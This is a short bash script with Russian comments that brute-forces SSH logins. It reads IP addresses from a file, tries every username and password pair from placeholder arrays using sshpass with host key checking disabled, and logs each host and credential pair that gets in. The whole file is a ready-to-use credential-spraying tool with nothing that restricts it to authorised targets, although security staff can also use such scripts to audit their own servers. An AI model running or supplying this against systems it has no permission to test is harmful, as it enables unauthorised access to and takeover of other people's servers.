#!/bin/bash
# Скрипт читает список IP адресов из файла $IP_LIST_FILE, затем пробует подключиться к ним под учетками из массива USERS_ARRAY, используя пароли из массива PASSWORDS_ARRAY. 
# В случае успешного подключения, выводит IP адрес сервера и валидные креды от него.

USERS_ARRAY=("USER1" "USER2")
PASSWORDS_ARRAY=("PASSWORD1" "PASSWORD2" "PASSWORD3")
IP_ARRAY=() # Массив для IP-адресов
IP_LIST_FILE="ip_list.txt"
LOG_FILE="ip_accessed_list_log.txt"

# Прочитать IP-адреса из файла и добавить их в массив
while IFS= read -r ip; do
    IP_ARRAY+=("$ip")
done < "$IP_LIST_FILE"

# Преобразовать массив IP-адресов в строку через пробел
IP_STRING="${IP_ARRAY[@]}"

# Создание / очистка лог-файла
> $LOG_FILE

# Для каждого IP-адреса
for IP in "${IP_ARRAY[@]}"; do
    for USER in "${USERS_ARRAY[@]}"; do
        for PASS in "${PASSWORDS_ARRAY[@]}"; do
            result=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER"@"$IP" echo 'CONNECTED')
            if echo "$result" | grep -q "CONNECTED"; then
                echo "ПОДКЛЮЧЕНО! Host: $IP, username: $USER, password: $PASS" | tee -a $LOG_FILE
            # Для тестирования:    
            # else 
            #     echo "Безуспешная попытка подключения к $IP под пользователем $USER с паролем $PASS"
            fi
        done
    done
done
exit 1
